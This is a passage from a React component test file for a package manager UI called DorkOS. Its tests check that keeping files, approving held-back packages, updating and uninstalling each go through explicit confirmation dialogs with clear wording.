      expect(note.querySelector('summary')).toHaveTextContent(
        'Kept 3 files an update couldn’t sort. 2 of them still run.'
      );
      await user.click(note.querySelector('summary')!);
      expect(within(note).getByRole('list', { name: 'Still runs' })).toHaveTextContent(
        'commands/old.mdskills/old/SKILL.md'
      );
      const kept = within(note).getByRole('list', { name: 'Kept' });
      expect(kept).toHaveTextContent('notes.txt');
      // Each file is listed once, under the heading that fits it.
      expect(kept).not.toHaveTextContent('commands/old.md');
    });

    // Purpose (DOR-2341): kept files nothing can sort become the person's only
    // after they see them and confirm; the confirm sends back exactly the key
    // the row carried, for exactly this installation. Fails if the button
    // keeps without asking, or sends another installation's key.
    it('keeps the kept files as the person’s only after a confirm, bound to what the row showed', async () => {
      const user = userEvent.setup();
      showRows([FLOW], [makeCheck(FLOW)]);
      setIntegrity({
        [FLOW.installPath]: {
          status: 'clean',
          customized: [],
          unproven: {
            files: ['notes.txt', 'skills/old/SKILL.md'],
            running: ['skills/old/SKILL.md'],
            check: { source: 'local' },
            keepKey: 'sha256:kept',
          },
        },
      });
      render(<InstalledPackagesView />);

      const note = screen.getByTestId('installation-integrity-unproven');
      await user.click(note.querySelector('summary')!);
      await user.click(within(note).getByRole('button', { name: /Keep the files Flow kept/ }));
      expect(keepMutate).not.toHaveBeenCalled();

      const dialog = await screen.findByRole('dialog');
      expect(dialog).toHaveTextContent('Keep these Flow files as yours?');
      expect(dialog).toHaveTextContent('Nothing is moved or deleted.');
      expect(dialog).toHaveTextContent('No earlier version to compare with.');
      expect(dialog).toHaveTextContent('They now run as your own files.');
      expect(within(dialog).getByRole('list', { name: 'Still runs' })).toHaveTextContent(
        'skills/old/SKILL.md'
      );
      await user.click(within(dialog).getByRole('button', { name: 'Keep them as mine' }));

      expect(keepMutate).toHaveBeenCalledWith({
        name: FLOW.name,
        options: { installRoot: FLOW.installPath, keepKey: 'sha256:kept' },
      });
    });

    // Purpose (DOR-2341 review): Check files comes first. Keeping is offered
    // only where Check files cannot help (no earlier version, or it could not
    // be downloaded), so a person is never steered past the sort that would
    // set leftovers aside.
    it('offers Keep these as mine only where Check files cannot sort the files', async () => {
      const user = userEvent.setup();
      const withCheck = (check: object) => ({
        [FLOW.installPath]: {
          status: 'clean' as const,
          customized: [],
          unproven: {
            files: ['notes.txt'],
            running: [],
            check,
            keepKey: 'sha256:kept',
          },
        },
      });
      showRows([FLOW], [makeCheck(FLOW)]);

      setIntegrity(withCheck({ source: 'fetchable' }) as never);
      render(<InstalledPackagesView />);
      await user.click(
        screen.getByTestId('installation-integrity-unproven').querySelector('summary')!
      );
      expect(screen.queryByRole('button', { name: /Keep the files Flow kept/ })).toBeNull();
      expect(screen.getByRole('button', { name: 'Check the files of Flow' })).toBeEnabled();
      cleanup();

      setIntegrity(
        withCheck({
          source: 'fetchable',
          last: {
            outcome: 'fetch-failed',
            message: 'Couldn’t fetch the version of flow you had before.',
          },
        }) as never
      );
      render(<InstalledPackagesView />);
      await user.click(
        screen.getByTestId('installation-integrity-unproven').querySelector('summary')!
      );
      expect(screen.getByRole('button', { name: 'Check the files of Flow' })).toBeEnabled();
      await user.click(screen.getByRole('button', { name: /Keep the files Flow kept/ }));
      const dialog = await screen.findByRole('dialog');
      expect(dialog).toHaveTextContent('DorkOS couldn’t download the old version to compare.');
      expect(dialog).not.toHaveTextContent('No earlier version');
    });

    // Purpose (DOR-2341): for a global package held back from sessions, the
    // confirm shows everything it runs and sends that back, so keeping also
    // approves it as it is now, the same as a Review; nothing is sent until
    // what it runs has been shown.
    it('shows what a held-back package runs, and sends it back with the keep', async () => {
      const user = userEvent.setup();
      const held = {
        ...FLOW,
        heldBack: { reason: 'unasked' as const, reviewable: true, note: 'Held back.' },
      };
      const effects = {
        hooks: [{ event: 'Stop', matcher: null, command: 'echo hi', source: null }],
        schedules: [],
        mcpServers: [],
        lspServers: [],
        monitors: [],
        executables: [],
        skillTools: [],
        skillCommands: [],
      };
      heldBackQuery = { isPending: true };
      showRows([held], [makeCheck(held)]);
      setIntegrity({
        [held.installPath]: {
          status: 'clean',
          customized: [],
          unproven: {
            files: ['skills/old/SKILL.md'],
            running: ['skills/old/SKILL.md'],
            check: { source: 'local' },
            keepKey: 'sha256:kept',
          },
        },
      });
      const { rerender } = render(<InstalledPackagesView />);
      const note = screen.getByTestId('installation-integrity-unproven');
      await user.click(note.querySelector('summary')!);
      await user.click(within(note).getByRole('button', { name: /Keep the files Flow kept/ }));
      const waiting = await screen.findByRole('dialog');
      expect(within(waiting).getByRole('button', { name: 'Keep them as mine' })).toBeDisabled();

      heldBackQuery = {
        isPending: false,
        data: [{ name: held.name, effects, bindsTo: 'sha256:pkg', changedSinceApproval: false }],
      };
      rerender(<InstalledPackagesView />);
      const dialog = screen.getByRole('dialog');
      expect(dialog).toHaveTextContent('Keeping also lets it run in every chat');
      expect(within(dialog).getByRole('list', { name: 'What Flow runs' })).toHaveTextContent(
        'echo hi'
      );
      await user.click(within(dialog).getByRole('button', { name: 'Keep them and let it run' }));

      expect(keepMutate).toHaveBeenCalledWith({
        name: held.name,
        options: {
          installRoot: held.installPath,
          keepKey: 'sha256:kept',
          review: { effects, bindsTo: 'sha256:pkg' },
        },
      });
      heldBackQuery = { data: [], isPending: false };
    });

    // Purpose (review 3): the update-all confirm says, per installation, what
    // an update does to changed files: edited ones replaced with copies kept,
    // added ones kept, removed ones put back; no `.dork-old` jargon.
    it('says in the update-all confirm what an update does to changed files', async () => {
      const user = userEvent.setup();
      const other = makeInstalled({ installPath: '/tmp/.dork/agents/reviewer' });
      showRows([FLOW, other], [staleCheck(FLOW, '0.7.3'), staleCheck(other, '1.3.0')]);
      setIntegrity({ [FLOW.installPath]: MODIFIED });

      render(<InstalledPackagesView />);
      await user.click(screen.getByRole('button', { name: 'Update all…' }));
      const dialog = await screen.findByRole('dialog');
      const items = within(
        within(dialog).getByRole('list', { name: 'Packages to update' })
      ).getAllByRole('listitem');

      const flowItem = items.find((i) => i.textContent?.includes('Flow'))!;
      expect(flowItem).toHaveTextContent(
        'Updating replaces the 2 files you edited and keeps your copies beside them.The file you added stays.The file you removed comes back.'
      );
      expect(flowItem).not.toHaveTextContent('.dork-old');
      const otherItem = items.find((i) => i.textContent?.includes('Reviewer'))!;
      expect(otherItem).not.toHaveTextContent('Updating replaces');
    });
  });

  describe('uninstall confirmation flow', () => {
    it('does not fire the mutation on the first click — enters confirm mode instead', async () => {
      const user = userEvent.setup();
      setInstalledState({ data: [makeInstalled({ name: '@dorkos/reviewer' })] });

      render(<InstalledPackagesView />);

      await user.click(screen.getByRole('button', { name: /^uninstall Reviewer$/i }));

      expect(uninstallMutate).not.toHaveBeenCalled();
      // Button now reads "Uninstall now" and has the destructive variant aria-label.
      expect(screen.getByRole('button', { name: /^uninstall Reviewer now$/i })).toBeInTheDocument();
    });

    it('fires the uninstall mutation with purge: false on the second click within the window', async () => {
      const user = userEvent.setup();
      setInstalledState({ data: [makeInstalled({ name: '@dorkos/reviewer' })] });

      render(<InstalledPackagesView />);

      await user.click(screen.getByRole('button', { name: /^uninstall Reviewer$/i }));
      await user.click(screen.getByRole('button', { name: /^uninstall Reviewer now$/i }));

      expect(uninstallMutate).toHaveBeenCalledTimes(1);
      expect(uninstallMutate).toHaveBeenCalledWith({
        name: '@dorkos/reviewer',
        options: { purge: false },
      });
    });

    it('auto-cancels the confirm window after 3 seconds', () => {
      vi.useFakeTimers();

      try {
        setInstalledState({ data: [makeInstalled({ name: '@dorkos/reviewer' })] });

        render(<InstalledPackagesView />);

        // Use fireEvent (synchronous) to avoid userEvent's internal timers
        // fighting with vi.useFakeTimers.
        fireEvent.click(screen.getByRole('button', { name: /^uninstall Reviewer$/i }));

        expect(
          screen.getByRole('button', { name: /^uninstall Reviewer now$/i })
        ).toBeInTheDocument();

        // Advance past the 3-second confirm window.
        act(() => {
          vi.advanceTimersByTime(3_100);
        });

        // Back to the normal uninstall button.
        expect(screen.getByRole('button', { name: /^uninstall Reviewer$/i })).toBeInTheDocument();
        expect(uninstallMutate).not.toHaveBeenCalled();
      } finally {
        vi.useRealTimers();
      }
    });

    it('disables only the row whose uninstall is in flight', () => {
      setInstalledState({
        data: [
          makeInstalled({ name: '@dorkos/reviewer' }),
          makeInstalled({ name: '@dorkos/formatter' }),
        ],
      });
      setUninstallState({ isPending: true, variables: { name: '@dorkos/reviewer' } });

      render(<InstalledPackagesView />);

      const reviewerBtn = screen.getByRole('button', { name: /uninstall Reviewer/i });
      const formatterBtn = screen.getByRole('button', { name: /^uninstall Formatter$/i });

      expect(reviewerBtn).toBeDisabled();
      expect(reviewerBtn.textContent).toMatch(/removing/i);
      expect(formatterBtn).not.toBeDisabled();
    });
  });

  describe('dev links (DOR-2696)', () => {
    const devLinked = () =>
      makeInstalled({
        name: 'flow',
        type: 'plugin',
        installPath: '/tmp/.dork/plugins/flow',
        devLink: { path: '/work/flow', state: 'active', parked: false },
      });

    it('badges a dev-linked row with its folder and offers no Update or Uninstall', () => {
      // Purpose: a dev link is switched by unlinking, never updated or uninstalled.
      const pkg = devLinked();
      setInstalledState({ data: [pkg] });
      setUpdatesState({ rows: [pkg], checks: [staleCheck(pkg, '2.0.0')] });

      render(<InstalledPackagesView />);

      expect(screen.getByText('Dev link')).toBeInTheDocument();
      expect(screen.getByText('/work/flow')).toBeInTheDocument();
      expect(screen.getByRole('button', { name: 'Unlink Flow' })).toBeInTheDocument();
      expect(screen.queryByRole('button', { name: /^uninstall/i })).toBeNull();
      expect(screen.queryByRole('button', { name: /^update/i })).toBeNull();
    });

    it('opens the unlink dialog from the row', async () => {
      const pkg = devLinked();
      setInstalledState({ data: [pkg] });
      render(<InstalledPackagesView />);

      await userEvent.setup().click(screen.getByRole('button', { name: 'Unlink Flow' }));

      expect(await screen.findByText('Unlink Flow?')).toBeInTheDocument();
      expect(screen.getByText('Flow is removed. Your folder is not touched.')).toBeInTheDocument();
    });
  });
});
